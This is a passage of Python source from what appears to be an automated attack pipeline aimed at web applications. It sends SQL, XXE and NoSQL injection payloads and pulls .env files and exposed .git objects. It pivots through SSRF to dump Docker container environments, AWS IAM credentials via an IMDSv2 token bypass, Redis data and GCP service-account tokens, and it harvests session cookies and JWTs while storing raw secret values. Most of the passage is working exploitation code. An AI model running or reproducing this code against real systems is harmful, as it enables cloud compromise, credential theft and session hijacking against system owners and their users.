                cost_reward_matrix.append({
                    "vector": finding.get("title", "Unknown")[:80],
                    "attack_cost_usd": round(reward * 0.02, 2),
                    "potential_loss_usd": reward,
                    "roi_multiplier": round(reward / max(reward * 0.02, 1), 1),
                    "severity": sev,
                    "exploitability": "HIGH" if sev in ("critical", "high") else "MEDIUM",
                })

        idor_dumps = []
        admin_dumps = []

        for finding in self.findings:
            cat = (finding.get("category", "") or "").lower()
            title = (finding.get("title", "") or "").lower()
            desc = (finding.get("description", "") or "").lower()
            sev = (finding.get("severity", "") or "").lower()
            combined = f"{title} {desc} {cat}"

            if any(kw in combined for kw in ["idor", "sequential fetch", "direct object", "user record", "enumerat"]):
                idor_dumps.append({
                    "source": finding.get("title", "Unknown"),
                    "category": "IDOR_DATA_DUMP",
                    "severity": sev,
                    "evidence_hash": hashlib.sha256(_sanitize(finding.get("description", "")).encode()).hexdigest()[:16],
                    "extraction_type": "pii_exfiltration" if any(k in combined for k in ["pii", "cpf", "email", "phone"]) else "record_enumeration",
                    "data_classification": "GDPR / LGPD / PCI-DSS",
                })

            if any(kw in combined for kw in ["admin privilege", "admin exploitation", "price manipulation", "coupon forgery", "privilege escalat", "write confirmed"]):
                admin_dumps.append({
                    "source": finding.get("title", "Unknown"),
                    "category": "ADMIN_EXPLOITATION",
                    "severity": sev,
                    "evidence_hash": hashlib.sha256(_sanitize(finding.get("description", "")).encode()).hexdigest()[:16],
                    "extraction_type": "full_admin_control" if "write" in combined else "admin_read_access",
                    "data_classification": "TOTAL COMPROMISE",
                })

        total_dumps = len(financial_dumps) + len(db_dumps) + len(docker_dumps) + len(config_dumps) + len(idor_dumps) + len(admin_dumps)

        for fd in financial_dumps[:5]:
            pipeline_log(
                f"[INCIDENT] FINANCIAL DUMP: {fd['source'][:60]} â€” {fd['extraction_type']} [{fd['data_classification']}]",
                "error", "incident_absorber"
            )

        for dd in db_dumps[:5]:
            pipeline_log(
                f"[INCIDENT] DATABASE DUMP: {dd['source'][:60]} â€” {dd['extraction_type']} [{dd['data_classification']}]",
                "error", "incident_absorber"
            )

        for cd in config_dumps[:5]:
            pipeline_log(
                f"[INCIDENT] CONFIG DUMP: {cd['source'][:60]} â€” {cd['extraction_type']} [{cd['data_classification']}]",
                "warn", "incident_absorber"
            )

        for id_dump in idor_dumps[:5]:
            pipeline_log(
                f"[INCIDENT] IDOR DUMP: {id_dump['source'][:60]} â€” {id_dump['extraction_type']} [{id_dump['data_classification']}]",
                "error", "incident_absorber"
            )

        for ad in admin_dumps[:5]:
            pipeline_log(
                f"[INCIDENT] ADMIN EXPLOITATION: {ad['source'][:60]} â€” {ad['extraction_type']} [{ad['data_classification']}]",
                "error", "incident_absorber"
            )

        if cost_reward_matrix:
            top_roi = sorted(cost_reward_matrix, key=lambda x: x["roi_multiplier"], reverse=True)[:3]
            for entry in top_roi:
                pipeline_log(
                    f"[COST-REWARD] {entry['vector'][:50]} â€” Cost: ${entry['attack_cost_usd']} â†’ Loss: ${entry['potential_loss_usd']:,.0f} (ROI: {entry['roi_multiplier']}x)",
                    "error", "incident_absorber"
                )

        self.incident_evidence = {
            "financial_dumps": financial_dumps,
            "db_dumps": db_dumps,
            "docker_dumps": docker_dumps,
            "config_dumps": config_dumps,
            "idor_dumps": idor_dumps,
            "admin_dumps": admin_dumps,
            "cost_reward_matrix": cost_reward_matrix,
            "total_evidence_items": total_dumps,
            "total_cost_reward_vectors": len(cost_reward_matrix),
        }

        if total_dumps > 0:
            self._add_finding({
                "title": f"Incident Absorber: {total_dumps} extraction proof(s) consolidated",
                "description": f"The Incident Absorber consolidated {len(financial_dumps)} financial, {len(db_dumps)} database, {len(docker_dumps)} container, {len(config_dumps)} config, {len(idor_dumps)} IDOR, and {len(admin_dumps)} admin exploitation proofs from the full kill chain analysis. Cost-Reward analysis identified {len(cost_reward_matrix)} exploitable vectors.",
                "severity": "critical" if len(financial_dumps) > 0 or len(db_dumps) > 0 or len(idor_dumps) > 0 or len(admin_dumps) > 0 else "high",
                "category": "incident_evidence",
                "module": "incident_absorber",
                "phase": "incident_absorber",
            })

        self.phases_completed.append("incident_absorber")
        pipeline_emit("phase_update", {"phase": "incident_absorber", "status": "completed"})
        pipeline_emit("telemetry_update", {"progress": 67, "phase": "incident_absorber"})

        pipeline_log(
            f"[INCIDENT ABSORBER COMPLETE] {total_dumps} dumps ({len(financial_dumps)}F/{len(db_dumps)}D/{len(docker_dumps)}C/{len(config_dumps)}X), "
            f"{len(cost_reward_matrix)} cost-reward vectors",
            "error" if total_dumps > 0 else "success",
            "incident_absorber"
        )

    async def _phase_3_db_validation(self):
        pipeline_emit("phase_update", {"phase": "db_validation", "status": "running"})
        pipeline_log("[PHASE 4/6] DB VALIDATION â€” Testing input validation and stack trace exposure...", "warn", "db_validation")

        stack_traces_found = []
        db_structure_leaks = []
        error_messages = []

        test_paths = ["/", "/api/search", "/api/products", "/api/users", "/search", "/api/v1/data", "/api/orders"]
        test_params = ["id", "search", "q", "query", "item", "product_id", "user"]

        for path in test_paths:
            for iv_payload in INPUT_VALIDATION_PAYLOADS:
                for param in test_params[:3]:
                    url = f"{self.base_url}{path}"
                    start = time.time()
                    try:
                        if iv_payload["type"] == "xxe":
                            resp = await self.client.post(
                                url,
                                content=iv_payload["payload"],
                                headers={"Content-Type": "application/xml"},
                            )
                        elif iv_payload["type"] == "nosqli":
                            resp = await self.client.post(
                                url,
                                content=iv_payload["payload"],
                                headers={"Content-Type": "application/json"},
                            )
                        else:
                            resp = await self.client.get(
                                f"{url}?{param}={iv_payload['payload']}",
                            )

                        elapsed = int((time.time() - start) * 1000)
                        body = resp.text[:8000]

                        has_stack_trace = any(p.search(body) for p in STACK_TRACE_PATTERNS)
                        has_db_structure = any(p.search(body) for p in DB_STRUCTURE_PATTERNS)
                        has_sql_error = any(p.search(body) for p in SQL_ERROR_PATTERNS)

                        if has_stack_trace:
                            stack_traces_found.append({
                                "path": path, "param": param,
                                "payload_name": iv_payload["name"],
                                "snippet": body[:500],
                            })
                            pipeline_log(
                                f"[THREAT] STACK TRACE EXPOSED: {path}?{param}= ({iv_payload['name']})",
                                "error", "db_validation"
                            )
                            self._add_finding({
                                "title": f"Stack Trace Exposure: {iv_payload['name']} at {path}",
                                "description": f"Application exposes internal stack trace when receiving payload '{iv_payload['name']}' via parameter '{param}'. This reveals framework, file paths, and internal structure.",
                                "severity": "high",
                                "category": "information_disclosure",
                                "module": "sniper_pipeline",
                                "phase": "db_validation",
                                "evidence": body[:300],
                            })
                            self._add_probe({
                                "probe_type": "STACK_TRACE_LEAK",
                                "target": self.target, "endpoint": f"{path}?{param}=...",
                                "method": "GET", "status_code": resp.status_code,
                                "response_time_ms": elapsed, "vulnerable": True,
                                "verdict": "VULNERABLE â€” Stack trace exposed",
                                "severity": "HIGH",
                                "description": iv_payload["name"],
                                "payload": iv_payload["payload"][:100],
                                "evidence": "Internal stack trace visible in HTTP response",
                                "response_snippet": body[:300],
                                "timestamp": _ts(),
                            })

                        if has_db_structure:
                            db_structure_leaks.append({
                                "path": path, "param": param,
                                "payload_name": iv_payload["name"],
                                "snippet": body[:500],
                            })
                            pipeline_log(
                                f"[THREAT] DB STRUCTURE LEAKED: {path}?{param}= ({iv_payload['name']})",
                                "error", "db_validation"
                            )
                            self._add_finding({
                                "title": f"Database Structure Exposure at {path}",
                                "description": f"Input '{iv_payload['name']}' causes database structure information to leak. Tables, columns, or queries are visible in the response.",
                                "severity": "critical",
                                "category": "sql_injection",
                                "module": "sniper_pipeline",
                                "phase": "db_validation",
                                "evidence": body[:300],
                            })

                        if has_sql_error:
                            error_messages.append({
                                "path": path, "param": param,
                                "payload_name": iv_payload["name"],
                            })
                            pipeline_log(
                                f"[THREAT] SQL ERROR in response: {path}?{param}= ({iv_payload['name']})",
                                "error", "db_validation"
                            )
                            self._add_probe({
                                "probe_type": "SQL_ERROR_LEAK",
                                "target": self.target, "endpoint": f"{path}?{param}=...",
                                "method": "GET", "status_code": resp.status_code,
                                "response_time_ms": elapsed, "vulnerable": True,
                                "verdict": "VULNERABLE â€” SQL error message exposed",
                                "severity": "CRITICAL",
                                "description": iv_payload["name"],
                                "payload": iv_payload["payload"][:100],
                                "evidence": "SQL error pattern detected in response body",
                                "response_snippet": body[:300],
                                "timestamp": _ts(),
                            })

                        if not (has_stack_trace or has_db_structure or has_sql_error):
                            pipeline_log(
                                f"[BLOCK] Input sanitized: {path}?{param}= ({iv_payload['name']}) â€” HTTP {resp.status_code}",
                                "success", "db_validation"
                            )

                    except Exception:
                        pass

        self.db_validation_report = {
            "stack_traces_found": len(stack_traces_found),
            "db_structure_leaks": len(db_structure_leaks),
            "sql_error_leaks": len(error_messages),
            "total_tests": len(test_paths) * len(INPUT_VALIDATION_PAYLOADS) * min(len(test_params), 3),
            "details": {
                "stack_traces": stack_traces_found[:10],
                "db_leaks": db_structure_leaks[:10],
                "sql_errors": error_messages[:10],
            },
        }

        self.phases_completed.append("db_validation")
        pipeline_emit("phase_update", {"phase": "db_validation", "status": "completed"})
        pipeline_emit("telemetry_update", {"progress": 75, "phase": "db_validation"})

        total_vulns = len(stack_traces_found) + len(db_structure_leaks) + len(error_messages)
        pipeline_log(
            f"[DB VALIDATION COMPLETE] {total_vulns} vulnerabilities â€” "
            f"{len(stack_traces_found)} stack traces, {len(db_structure_leaks)} DB leaks, {len(error_messages)} SQL errors",
            "error" if total_vulns > 0 else "success",
            "db_validation"
        )

    async def _sinfo_env_parser(self):
        pipeline_log("[SINFO] Full ENV Parser â€” Attempting brute extraction of .env secrets...", "warn", "infra_ssrf")
        env_paths = ["/.env", "/.env.local", "/.env.production", "/.env.staging", "/.env.backup", "/.env.dev", "/env", "/app/.env", "/config/.env"]
        extracted_secrets = []

        for env_path in env_paths:
            try:
                resp = await self.client.get(f"{self.base_url}{env_path}")
                if resp.status_code == 200 and len(resp.text.strip()) > 5:
                    body = resp.text
                    for pattern in ENV_SECRET_PATTERNS:
                        for match in pattern.finditer(body):
                            key_name = match.group(1)
                            raw_value = match.group(2).strip()
                            extracted_secrets.append({
                                "source": env_path,
                                "key": key_name,
                                "raw_value": raw_value,
                                "value_hash": hashlib.sha256(raw_value.encode()).hexdigest()[:16],
                                "value_length": len(raw_value),
                                "category": "credential" if any(k in key_name.upper() for k in ["PASSWORD", "SECRET", "TOKEN", "KEY"]) else "config",
                            })

                    lines = [l.strip() for l in body.split('\n') if l.strip() and not l.strip().startswith('#')]
                    kv_count = sum(1 for l in lines if '=' in l)

                    pipeline_log(f"[SINFO] ENV DUMP: {env_path} â€” {kv_count} KEY=VALUE pairs, {len(extracted_secrets)} secrets identified", "error", "infra_ssrf")

                    self._add_finding({
                        "title": f"SINFO: Full .env dump at {env_path} â€” {kv_count} variables extracted",
                        "description": f"Complete environment file accessible at {env_path}. Parsed {kv_count} key-value pairs including {len(extracted_secrets)} high-value secrets (database URIs, API keys, authentication tokens). Raw credential extraction confirmed.",
                        "severity": "critical",
                        "category": "env_exposure",
                        "module": "sinfo_parser",
                        "phase": "infra_ssrf",
                        "evidence": f"{kv_count} env vars, {len(extracted_secrets)} secrets",
                    })
                    self._add_asset({
                        "path": f"{self.base_url}{env_path}",
                        "asset_type": "secret",
                        "label": f"ENV dump: {env_path} ({kv_count} vars)",
                        "severity": "critical",
                    })
            except Exception:
                pass

        self.sinfo_dump = {
            "env_paths_tested": len(env_paths),
            "secrets_extracted": len(extracted_secrets),
            "secrets": extracted_secrets[:50],
        }

        if extracted_secrets:
            pipeline_log(f"[SINFO] ENV PARSER COMPLETE â€” {len(extracted_secrets)} raw secrets extracted across {len(env_paths)} paths", "error", "infra_ssrf")

    async def _git_objects_reconstructor(self):
        pipeline_log("[SINFO] Git Objects Reconstructor â€” Probing /.git/ for repository leak...", "warn", "infra_ssrf")
        git_objects = []
        git_exposed = False

        for git_path in GIT_OBJECT_PATHS:
            try:
                resp = await self.client.get(f"{self.base_url}{git_path}")
                if resp.status_code == 200 and len(resp.text.strip()) > 2:
                    content = resp.text[:2000]
                    git_objects.append({
                        "path": git_path,
                        "size": len(resp.text),
                        "raw_content": content[:5000],
                        "content_hash": hashlib.sha256(content.encode()).hexdigest()[:16],
                        "content_preview": content[:200],
                    })
                    git_exposed = True

                    if git_path == "/.git/HEAD":
                        ref_match = re.search(r'ref:\s*refs/heads/(\S+)', content)
                        branch = ref_match.group(1) if ref_match else "unknown"
                        pipeline_log(f"[SINFO] GIT HEAD EXPOSED: Active branch = {branch}", "error", "infra_ssrf")

                    if git_path == "/.git/config":
                        remote_match = re.findall(r'url\s*=\s*(.+)', content)
                        for remote in remote_match:
                            pipeline_log(f"[SINFO] GIT REMOTE: {remote.strip()}", "error", "infra_ssrf")

                    if git_path == "/.git/logs/HEAD":
                        commit_hashes = re.findall(r'([a-f0-9]{40})', content)
                        if commit_hashes:
                            pipeline_log(f"[SINFO] GIT LOG: {len(commit_hashes)} commit hashes recoverable â€” scanning for deleted secrets", "error", "infra_ssrf")

                            for ch in commit_hashes[:5]:
                                obj_path = f"/.git/objects/{ch[:2]}/{ch[2:]}"
                                try:
                                    obj_resp = await self.client.get(f"{self.base_url}{obj_path}")
                                    if obj_resp.status_code == 200:
                                        git_objects.append({
                                            "path": obj_path,
                                            "size": len(obj_resp.content),
                                            "content_hash": hashlib.sha256(obj_resp.content).hexdigest()[:16],
                                            "type": "git_object",
                                        })
                                except Exception:
                                    pass
            except Exception:
                pass

        if git_exposed:
            self._add_finding({
                "title": f"SINFO: Git repository exposed â€” {len(git_objects)} objects recoverable",
                "description": f"Full .git directory exposed at {self.base_url}/.git/. Recovered {len(git_objects)} git objects including HEAD, config, commit logs, and object blobs. Historical commit reconstruction possible â€” previously deleted secrets may be recoverable from git history.",
                "severity": "critical",
                "category": "git_exposure",
                "module": "git_reconstructor",
                "phase": "infra_ssrf",
                "evidence": f"{len(git_objects)} git objects recovered",
            })
            self._add_asset({
                "path": f"{self.base_url}/.git/",
                "asset_type": "config",
                "label": f"Git repository dump ({len(git_objects)} objects)",
                "severity": "critical",
            })

        self.git_objects_dump = {
            "paths_tested": len(GIT_OBJECT_PATHS),
            "objects_recovered": len(git_objects),
            "git_exposed": git_exposed,
            "objects": git_objects[:30],
        }

    async def _docker_full_inspect(self, confirmed_ssrf: list):
        docker_ssrf = [c for c in confirmed_ssrf if "docker" in c.get("vector", "").lower() or "2375" in c.get("endpoint", "")]
        if not docker_ssrf:
            return

        pipeline_log("[SINFO] Docker Full Inspect â€” Pivoting via confirmed SSRF to dump container internals...", "error", "infra_ssrf")
        docker_data = []
        pivot_endpoint = docker_ssrf[0].get("endpoint", "/api/proxy")
        pivot_param = docker_ssrf[0].get("param", "url")

        for ep in DOCKER_INSPECT_ENDPOINTS:
            docker_url = f"http://127.0.0.1:2375{ep['path']}"
            try:
                resp = await self.client.get(f"{self.base_url}{pivot_endpoint}?{pivot_param}={docker_url}")
                body = resp.text[:10000]
                hit = any(kw in body for kw in ep["detect"])
                if hit:
                    docker_data.append({
                        "endpoint": ep["path"],
                        "label": ep["label"],
                        "response_size": len(resp.text),
                        "raw_content": body[:5000],
                        "content_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                        "data_preview": body[:500],
                    })
                    pipeline_log(f"[DOCKER] {ep['label']} DUMPED: {len(resp.text)} bytes via {pivot_endpoint}", "error", "infra_ssrf")

                    if ep["path"] == "/containers/json":
                        try:
                            containers = json.loads(body) if body.strip().startswith('[') else []
                            for ct in containers[:5]:
                                ct_id = ct.get("Id", "")[:12]
                                inspect_url = f"http://127.0.0.1:2375/containers/{ct_id}/json"
                                try:
                                    insp_resp = await self.client.get(f"{self.base_url}{pivot_endpoint}?{pivot_param}={inspect_url}")
                                    if insp_resp.status_code == 200:
                                        insp_body = insp_resp.text[:5000]
                                        env_vars = re.findall(r'"Env":\s*\[(.*?)\]', insp_body, re.S)
                                        cred_count = sum(1 for v in env_vars if any(k in v.upper() for k in ["PASSWORD", "SECRET", "TOKEN", "KEY"]))
                                        docker_data.append({
                                            "endpoint": f"/containers/{ct_id}/json",
                                            "label": f"Container Inspect: {ct.get('Names', [ct_id])}",
                                            "response_size": len(insp_resp.text),
                                            "raw_content": insp_body[:5000],
                                            "content_hash": hashlib.sha256(insp_body.encode()).hexdigest()[:16],
                                            "credentials_found": cred_count,
                                        })
                                        if cred_count > 0:
                                            pipeline_log(f"[DOCKER] Container {ct_id} INSPECT: {cred_count} production credentials in Env vars", "error", "infra_ssrf")
                                except Exception:
                                    pass
                        except (json.JSONDecodeError, TypeError):
                            pass
            except Exception:
                pass

        if docker_data:
            self._add_finding({
                "title": f"Docker API Full Dump: {len(docker_data)} endpoints exfiltrated via SSRF",
                "description": f"Pivoted through confirmed SSRF ({pivot_endpoint}) to dump Docker API internals. Extracted container list, image inventory, network configs, volume mounts, and per-container inspect data including production environment variables with credentials.",
                "severity": "critical",
                "category": "docker_dump",
                "module": "docker_inspector",
                "phase": "infra_ssrf",
                "evidence": f"{len(docker_data)} Docker endpoints dumped",
            })

        self.docker_full_dump = {
            "pivot_endpoint": pivot_endpoint,
            "endpoints_dumped": len(docker_data),
            "data": docker_data[:20],
        }

    async def _imdsv2_bypass(self, confirmed_ssrf: list):
        aws_ssrf = [c for c in confirmed_ssrf if "aws" in c.get("vector", "").lower() or "169.254" in c.get("endpoint", "")]
        if not aws_ssrf:
            return

        pipeline_log("[SINFO] IMDSv2 Bypass â€” Attempting PUT token acquisition for AWS credential dump...", "error", "infra_ssrf")
        pivot_endpoint = aws_ssrf[0].get("endpoint", "/api/proxy")
        pivot_param = aws_ssrf[0].get("param", "url")
        imds_data = []
        token = None

        try:
            token_url = "http://169.254.169.254/latest/api/token"
            resp = await self.client.put(
                f"{self.base_url}{pivot_endpoint}",
                params={pivot_param: token_url},
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            )
            if resp.status_code == 200 and len(resp.text.strip()) > 10:
                token = resp.text.strip()
                pipeline_log(f"[IMDSv2] Session token acquired â€” {len(token)} chars â€” bypassing IMDSv2 protection", "error", "infra_ssrf")
        except Exception:
            pass

        metadata_headers = {"X-aws-ec2-metadata-token": token} if token else {}

        for cred_path in IMDSV2_CREDENTIAL_PATHS:
            try:
                meta_url = f"http://169.254.169.254{cred_path}"
                resp = await self.client.get(
                    f"{self.base_url}{pivot_endpoint}?{pivot_param}={meta_url}",
                    headers=metadata_headers,
                )
                if resp.status_code == 200 and len(resp.text.strip()) > 5:
                    body = resp.text[:3000]
                    imds_data.append({
                        "path": cred_path,
                        "size": len(resp.text),
                        "raw_content": body[:5000],
                        "content_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                        "imdsv2_bypassed": token is not None,
                    })

                    if "security-credentials" in cred_path:
                        role_names = [l.strip() for l in body.split('\n') if l.strip() and not l.strip().startswith('{')]
                        for role in role_names[:3]:
                            pipeline_log(f"[IMDSv2] IAM Role discovered: {role} â€” attempting credential dump", "error", "infra_ssrf")
                            try:
                                role_url = f"http://169.254.169.254{cred_path}{role}"
                                role_resp = await self.client.get(
                                    f"{self.base_url}{pivot_endpoint}?{pivot_param}={role_url}",
                                    headers=metadata_headers,
                                )
                                if role_resp.status_code == 200 and "AccessKeyId" in role_resp.text:
                                    imds_data.append({
                                        "path": f"{cred_path}{role}",
                                        "size": len(role_resp.text),
                                        "content_hash": hashlib.sha256(role_resp.text[:2000].encode()).hexdigest()[:16],
                                        "type": "iam_temporary_credentials",
                                        "imdsv2_bypassed": token is not None,
                                    })
                                    pipeline_log(f"[IMDSv2] CRITICAL: Temporary IAM credentials dumped for role {role}", "error", "infra_ssrf")
                            except Exception:
                                pass

                    if "instance-identity/document" in cred_path:
                        pipeline_log(f"[IMDSv2] Instance identity document extracted â€” account/region/instance info", "error", "infra_ssrf")
            except Exception:
                pass

        if imds_data:
            self._add_finding({
                "title": f"IMDSv2 Bypass: {len(imds_data)} AWS metadata endpoints dumped",
                "description": f"Successfully {'bypassed IMDSv2 with PUT token acquisition' if token else 'accessed IMDSv1 metadata'}. Dumped {len(imds_data)} metadata endpoints including IAM security credentials, instance identity, and user-data. Temporary AWS access keys may be present.",
                "severity": "critical",
                "category": "cloud_metadata",
                "module": "imdsv2_bypass",
                "phase": "infra_ssrf",
                "evidence": f"{len(imds_data)} IMDS endpoints, IMDSv2 bypass: {token is not None}",
            })

        self.imdsv2_dump = {
            "token_acquired": token is not None,
            "endpoints_dumped": len(imds_data),
            "data": imds_data[:20],
        }

    async def _capture_session_tokens(self):
        pipeline_log("[SINFO] Session Token Capture â€” Extracting cookies, JWTs, and session identifiers...", "warn", "infra_ssrf")
        tokens = []

        auth_endpoints = ["/", "/api/auth/session", "/api/me", "/api/user", "/api/profile", "/dashboard", "/api/v1/auth/token"]
        for ep in auth_endpoints:
            try:
                resp = await self.client.get(f"{self.base_url}{ep}")
                for cookie_name, cookie_value in resp.cookies.items():
                    tokens.append({
                        "type": "cookie",
                        "name": cookie_name,
                        "raw_value": str(cookie_value),
                        "value_hash": hashlib.sha256(str(cookie_value).encode()).hexdigest()[:16],
                        "value_length": len(str(cookie_value)),
                        "source": ep,
                        "httponly": "unknown",
                        "secure": "unknown",
                    })

                set_cookie_headers = resp.headers.get_list("set-cookie") if hasattr(resp.headers, 'get_list') else [resp.headers.get("set-cookie", "")]
                for sc in set_cookie_headers:
                    if sc and '=' in sc:
                        parts = sc.split(';')
                        name_val = parts[0].strip()
                        is_httponly = any("httponly" in p.lower() for p in parts)
                        is_secure = any("secure" in p.lower() for p in parts)
                        if not any(t["name"] == name_val.split('=')[0] for t in tokens):
                            tokens.append({
                                "type": "set-cookie",
                                "name": name_val.split('=')[0],
                                "raw_value": name_val,
                                "value_hash": hashlib.sha256(name_val.encode()).hexdigest()[:16],
                                "value_length": len(name_val),
                                "source": ep,
                                "httponly": is_httponly,
                                "secure": is_secure,
                            })

                body = resp.text[:5000]
                jwt_matches = re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body)
                for jwt in jwt_matches[:3]:
                    tokens.append({
                        "type": "jwt",
                        "name": "embedded_jwt",
                        "raw_value": jwt,
                        "value_hash": hashlib.sha256(jwt.encode()).hexdigest()[:16],
                        "value_length": len(jwt),
                        "source": ep,
                    })
                    pipeline_log(f"[SESSION] JWT token captured from {ep} â€” {len(jwt)} chars", "error", "infra_ssrf")
            except Exception:
                pass

        self.session_tokens_captured = tokens

        if tokens:
            pipeline_log(f"[SESSION] {len(tokens)} session tokens/cookies captured across {len(auth_endpoints)} endpoints", "error", "infra_ssrf")
            self._add_finding({
                "title": f"Session Token Capture: {len(tokens)} tokens/cookies extracted",
                "description": f"Captured {len(tokens)} session tokens including cookies and JWTs from {len(auth_endpoints)} authentication endpoints. Tokens can be replayed for session hijacking if HttpOnly/Secure flags are missing.",
                "severity": "high",
                "category": "session_capture",
                "module": "session_capture",
                "phase": "infra_ssrf",
            })

    async def _deep_credential_extraction(self, confirmed_ssrf: list):
        pipeline_log("[DEEP EXTRACT] Credential Persistence â€” Extracting raw infrastructure secrets from confirmed vectors...", "error", "infra_ssrf")
        extracted = []

        for ssrf_hit in confirmed_ssrf:
            vector_name = ssrf_hit.get("vector", "").lower()
            endpoint = ssrf_hit.get("endpoint", "/api/proxy")
            param = ssrf_hit.get("param", "url")

            if "docker" in vector_name or "2375" in ssrf_hit.get("endpoint", ""):
                docker_env_targets = [
                    "http://127.0.0.1:2375/containers/json",
                ]
                for det in docker_env_targets:
                    try:
                        resp = await self.client.get(f"{self.base_url}{endpoint}?{param}={det}")
                        if resp.status_code == 200 and len(resp.text) > 20:
                            body = resp.text[:10000]
                            try:
                                containers = json.loads(body) if body.strip().startswith('[') else []
                                for ct in containers[:8]:
                                    ct_id = ct.get("Id", "")[:12]
                                    ct_name = (ct.get("Names", [ct_id]) or [ct_id])[0] if isinstance(ct.get("Names"), list) else ct_id
                                    inspect_url = f"http://127.0.0.1:2375/containers/{ct_id}/json"
                                    try:
                                        insp = await self.client.get(f"{self.base_url}{endpoint}?{param}={inspect_url}")
                                        if insp.status_code == 200:
                                            insp_body = insp.text[:15000]
                                            env_block = re.findall(r'"Env"\s*:\s*\[(.*?)\]', insp_body, re.S)
                                            if env_block:
                                                env_str = env_block[0]
                                                env_pairs = re.findall(r'"([^"]+)"', env_str)
                                                cred_vars = []
                                                for ev in env_pairs:
                                                    if '=' in ev:
                                                        k, v = ev.split('=', 1)
                                                        if any(sec in k.upper() for sec in ["PASSWORD", "SECRET", "TOKEN", "KEY", "CREDENTIALS", "API_KEY", "DB_", "DATABASE", "REDIS", "MONGO", "STRIPE", "AWS", "PRIVATE"]):
                                                            cred_vars.append({
                                                                "key": k,
                                                                "value_hash": hashlib.sha256(v.encode()).hexdigest()[:16],
                                                                "value_length": len(v),
                                                                "container": ct_name,
                                                                "container_id": ct_id,
                                                            })
                                                if cred_vars:
                                                    extracted.append({
                                                        "source": f"SSRF â†’ Docker Container {ct_name}",
                                                        "type": "DOCKER_ENV_DUMP",
                                                        "container_id": ct_id,
                                                        "container_name": ct_name,
                                                        "credentials_count": len(cred_vars),
                                                        "credentials": cred_vars[:20],
                                                        "impact": "TOTAL_COMPROMISE",
                                                    })
                                                    pipeline_log(
                                                        f"[DEEP EXTRACT] DOCKER ENV DUMP: Container {ct_name} ({ct_id}) â€” {len(cred_vars)} production credentials captured (AWS_KEY, DB_PASS, STRIPE_KEY, etc.)",
                                                        "error", "infra_ssrf"
                                                    )
                                    except Exception:
                                        pass
                            except (json.JSONDecodeError, TypeError):
                                pass
                    except Exception:
                        pass

            if "redis" in vector_name:
                redis_commands = [
                    ("KEYS *", "http://127.0.0.1:6379/KEYS%20*"),
                    ("CONFIG GET *", "http://127.0.0.1:6379/CONFIG%20GET%20*"),
                    ("GET session:current", "http://127.0.0.1:6379/GET%20session:current"),
                    ("GET user:1", "http://127.0.0.1:6379/GET%20user:1"),
                    ("INFO keyspace", "http://127.0.0.1:6379/INFO%20keyspace"),
                ]
                redis_data = []
                for cmd_name, cmd_url in redis_commands:
                    try:
                        resp = await self.client.get(f"{self.base_url}{endpoint}?{param}={cmd_url}")
                        if resp.status_code == 200 and len(resp.text.strip()) > 2 and "-ERR" not in resp.text[:20]:
                            redis_data.append({
                                "command": cmd_name,
                                "response_size": len(resp.text),
                                "raw_content": resp.text[:5000],
                                "content_hash": hashlib.sha256(resp.text[:2000].encode()).hexdigest()[:16],
                                "has_data": len(resp.text.strip()) > 10,
                            })
                            pipeline_log(f"[DEEP EXTRACT] REDIS DUMP: {cmd_name} â€” {len(resp.text)} bytes exfiltrated", "error", "infra_ssrf")
                    except Exception:
                        pass
                if redis_data:
                    extracted.append({
                        "source": f"SSRF â†’ Redis ({endpoint})",
                        "type": "REDIS_DUMP",
                        "commands_executed": len(redis_data),
                        "commands": redis_data,
                        "impact": "SESSION_HIJACK_AND_DATA_THEFT",
                    })

            if "aws" in vector_name or "169.254" in vector_name or "metadata" in vector_name:
                iam_paths = [
                    "/latest/meta-data/iam/security-credentials/",
                    "/latest/meta-data/iam/info",
                    "/latest/user-data",
                ]
                aws_creds = []
                for iam_path in iam_paths:
                    try:
                        meta_url = f"http://169.254.169.254{iam_path}"
                        resp = await self.client.get(f"{self.base_url}{endpoint}?{param}={meta_url}")
                        if resp.status_code == 200 and len(resp.text.strip()) > 5:
                            body = resp.text[:5000]
                            if "security-credentials" in iam_path and not body.startswith('{'):
                                roles = [r.strip() for r in body.split('\n') if r.strip()]
                                for role in roles[:3]:
                                    cred_url = f"http://169.254.169.254{iam_path}{role}"
                                    try:
                                        cred_resp = await self.client.get(f"{self.base_url}{endpoint}?{param}={cred_url}")
                                        if cred_resp.status_code == 200 and "AccessKeyId" in cred_resp.text:
                                            aws_creds.append({
                                                "role": role,
                                                "type": "iam_temporary_credentials",
                                                "has_access_key": "AccessKeyId" in cred_resp.text,
                                                "has_secret_key": "SecretAccessKey" in cred_resp.text,
                                                "has_token": "Token" in cred_resp.text,
                                                "raw_content": cred_resp.text[:5000],
                                                "content_hash": hashlib.sha256(cred_resp.text[:2000].encode()).hexdigest()[:16],
                                            })
                                            pipeline_log(f"[DEEP EXTRACT] AWS IAM CREDENTIAL DUMP: Role={role} â€” AccessKeyId + SecretAccessKey + SessionToken extracted", "error", "infra_ssrf")
                                    except Exception:
                                        pass
                            elif "user-data" in iam_path:
                                for pat in ENV_SECRET_PATTERNS:
                                    for match in pat.finditer(body):
                                        aws_creds.append({
                                            "type": "user_data_secret",
                                            "key": match.group(1),
                                            "raw_value": match.group(2),
                                            "value_hash": hashlib.sha256(match.group(2).encode()).hexdigest()[:16],
                                        })
                    except Exception:
                        pass
                if aws_creds:
                    extracted.append({
                        "source": f"SSRF â†’ AWS Metadata ({endpoint})",
                        "type": "AWS_CREDENTIAL_DUMP",
                        "credentials_count": len(aws_creds),
                        "credentials": aws_creds[:20],
                        "impact": "FULL_CLOUD_COMPROMISE",
                    })

            if "gcp" in vector_name or "google" in vector_name:
                gcp_paths = [
                    "/computeMetadata/v1/project/project-id",
                    "/computeMetadata/v1/instance/service-accounts/default/token",
                    "/computeMetadata/v1/instance/service-accounts/default/email",
                ]
                gcp_data = []
                for gpath in gcp_paths:
                    try:
                        gcp_url = f"http://metadata.google.internal{gpath}"
                        resp = await self.client.get(
                            f"{self.base_url}{endpoint}?{param}={gcp_url}",
                            headers={"Metadata-Flavor": "Google"},
                        )
                        if resp.status_code == 200 and len(resp.text.strip()) > 2:
                            gcp_data.append({
                                "path": gpath,
                                "size": len(resp.text),
                                "has_token": "access_token" in resp.text.lower(),
                                "content_hash": hashlib.sha256(resp.text[:2000].encode()).hexdigest()[:16],
                            })
                            if "token" in gpath:
